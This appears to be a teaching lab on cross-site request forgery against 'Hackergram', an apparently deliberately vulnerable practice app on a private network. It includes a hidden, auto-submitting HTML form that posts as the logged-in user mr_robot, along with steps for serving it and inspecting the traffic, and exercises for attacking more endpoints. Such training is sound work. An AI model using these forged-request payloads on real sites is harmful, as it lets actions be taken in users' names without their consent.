# Cross-Site Request Forgery

In this attack you will create a post on behalf of user mr_robot. The procedure is the following:

1.	Create a file named index.html at the attacker with the following code:

``` html
<!DOCTYPE html>
<html>
    <head>
        <title>Fake Form</title>
    </head>
    <body onload="document.post_request.submit()">
        <form action="http://192.168.0.100/create_post" method="POST" name="post_request" style="display: none;">
            <input type="text" name="content" value="This is a forged post"/>
        </form>
    </body>
</html>
```

2.	Run an HTTP server at the attacker using ```python3 -m http.server 80```.
3.	Open a Wireshark probe at the victim-browser interface.
4.	Login as ```mr_robot``` at Hackergram.
5.	On another tab, access the attacker by entering ```http://192.168.0.10```.
6.	Check that the attack was successful, e.g., by searching the posts of ```mr_robot``` at Hackergram.
7.	Analyze the HTTP packets exchanged with Hackergram and identify the HTTP packet used for the attack. Check that the session cookie of this packet is the same as the other HTTP packets used in the mr_robot session.
8.	Now logout ```mr_robot``` from Hackergram and try the attack again. Was it successful? Why?

Additional exercises: Hackergram has other endpoints vulnerable to CSRF attacks. It has a total of six vulnerable endpoints, some using GET and others using POST. Explore Hackergram by creating a new user and observing the exchanged traffic when different actions are performed. This can be done using Wireshark or the Web Console of Firefox (Network tab). Based on this analysis, write the HTML code required to perform the attack, and demonstrate that it works.
